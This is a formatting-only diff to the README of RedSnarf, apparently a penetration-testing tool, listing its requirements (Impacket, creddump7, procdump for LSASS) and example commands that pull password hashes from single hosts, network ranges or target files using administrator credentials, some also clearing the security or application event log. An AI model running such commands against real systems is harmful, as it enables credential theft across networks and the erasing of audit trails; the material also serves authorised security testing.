@@ -42,7 +42,7 @@ o   Credsfile will accept a mix of pwdump, fgdump and plain text username and pa
 RedSnarf Usage
 =======================
 
-Requirements:  
+**Requirements:**  
 Impacket v0.9.16-dev - https://github.com/CoreSecurity/impacket.git  
 CredDump7 - https://github.com/Neohapsis/creddump7  
 Lsass Retrieval using procdump - https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx  
@@ -50,7 +50,7 @@ Netaddr (0.7.12) - pip install netaddr
 Termcolor (1.1.0) - pip install termcolor  
 iconv - used with parsing Mimikatz info locally  
 
-Show Help  
+**Show Help**  
 ./redsnarf.py -h  
 ./redsnarf.py --help  
 
@@ -61,22 +61,22 @@ Retrieve Local Hashes from a single machine using weak local credentials and cle
 **./redsnarf.py -H ip=10.0.0.50 -uC security**
 
 Retrieve Local Hashes from a single machine using weak local credentials and clearing the application event log  
-./redsnarf.py -H ip=10.0.0.50 -uC application
+**./redsnarf.py -H ip=10.0.0.50 -uC application**
 
 Retrieve Local Hashes from a single machine using local administrator credentials  
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d .
+**./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d .**
 
 Retrieve Local Hashes from a single machine using domain administrator credentials  
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com
+**./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com**
 
 Retrieve Hashes across a network range using local administrator credentials  
-./redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -d .
+**./redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -d .**
 
 Retrieve Hashes across a network range using domain administrator credentials  
-./redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -d yourdomain.com
+**./redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -d yourdomain.com**
 
 Retrieve Hashes across a network range using domain administrator credentials  
-./redsnarf.py -H file=targets.txt -u administrator -p Password01 -d yourdomain.com
+**./redsnarf.py -H file=targets.txt -u administrator -p Password01 -d yourdomain.com**
 
 Hash Spraying
 =======================
